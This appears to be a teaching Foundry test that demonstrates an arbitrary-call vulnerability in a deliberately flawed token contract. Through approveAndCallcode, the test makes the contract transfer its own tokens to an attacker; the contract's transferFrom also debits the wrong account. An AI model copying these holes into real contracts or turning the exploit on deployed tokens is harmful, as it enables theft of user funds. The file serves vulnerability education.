// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    TokenWhale TokenWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        TokenWhaleContract = new TokenWhale();
        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));
        console.log(
            "TokenWhale balance:",
            TokenWhaleContract.balanceOf(address(TokenWhaleContract))
        );

        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);

        console.log(
            "Alice calls approveAndCallcode on TokenWhaleContract"
        );
        vm.prank(alice);
        TokenWhaleContract.approveAndCallcode(
            address(TokenWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            TokenWhaleContract.balanceOf(address(TokenWhaleContract))
        );
        console.log(
            "Alice balance:",
            TokenWhaleContract.balanceOf(address(alice))
        );
    }

    receive() external payable {}
}

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000; // 1 mil
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }

    /* Approves and then calls the contract code*/

    function approveAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}